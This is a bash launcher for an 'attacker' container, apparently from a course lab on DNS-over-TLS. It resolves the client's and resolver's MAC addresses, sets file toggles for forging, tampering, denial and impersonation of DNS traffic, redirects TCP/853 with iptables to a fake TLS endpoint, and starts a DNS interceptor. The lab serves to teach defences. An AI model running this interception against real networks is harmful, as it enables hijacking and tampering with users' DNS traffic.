#!/bin/bash
set -e
sysctl -w net.ipv4.ip_forward=0 || true   # we relay in userspace, not via kernel forwarding

echo "[attacker] priming ARP for the client (172.16.1.10) and resolver (172.16.2.10)..."
for target in 172.16.1.10 172.16.2.10; do
    for i in 1 2 3 4 5; do
        ping -c1 -W1 "$target" >/dev/null 2>&1 || true
        arping -c1 -w1 -I eth0 "$target" >/dev/null 2>&1 || true
        MAC=$(ip neigh show "$target" | awk '{print $5}' | head -n1)
        [ -n "$MAC" ] && break
        sleep 1
    done
    if [ -z "$MAC" ]; then
        echo "[attacker] FATAL: never got an ARP entry for $target" >&2
        exit 1
    fi
    echo "[attacker] $target MAC = $MAC"
    if [ "$target" = "172.16.1.10" ]; then CLIENT_MAC="$MAC"; else RESOLVER_MAC="$MAC"; fi
done
export CLIENT_MAC RESOLVER_MAC

# Four independent toggles, same presence-of-file pattern used
# throughout this assignment. Toggle live at any time, no restart
# needed -- see dns_interceptor.cpp's header comment for exactly what
# each one does:
#   docker exec attacker touch /tmp/forge.on         # §2/3/6-style forge (only bites a cleartext fallback)
#   docker exec attacker touch /tmp/tamper.on         # §7.3 (i)
#   docker exec attacker touch /tmp/deny.on           # §7.3 (iii)
#   docker exec attacker touch /tmp/impersonate.on    # §7.3 (ii)
for flag in FORGE TAMPER DENY IMPERSONATE; do
    var="${flag}_ENABLED"
    path="/tmp/$(echo "$flag" | tr '[:upper:]' '[:lower:]').on"
    if [ "${!var:-0}" = "1" ]; then touch "$path"; else rm -f "$path"; fi
done

# Keep the local iptables REDIRECT for tls_endpoint in sync with
# /tmp/impersonate.on, so dns_interceptor's own raw relay and the
# kernel-level DNAT path are NEVER both active on TCP/853 at once.
(
    while true; do
        if [ -f /tmp/impersonate.on ]; then
            iptables -t nat -C PREROUTING -p tcp --dport 853 -j REDIRECT --to-port 8853 2>/dev/null \
                || iptables -t nat -A PREROUTING -p tcp --dport 853 -j REDIRECT --to-port 8853
        else
            iptables -t nat -D PREROUTING -p tcp --dport 853 -j REDIRECT --to-port 8853 2>/dev/null || true
        fi
        sleep 1
    done
) &

/usr/local/bin/tls_endpoint &

exec /usr/local/bin/dns_interceptor eth0
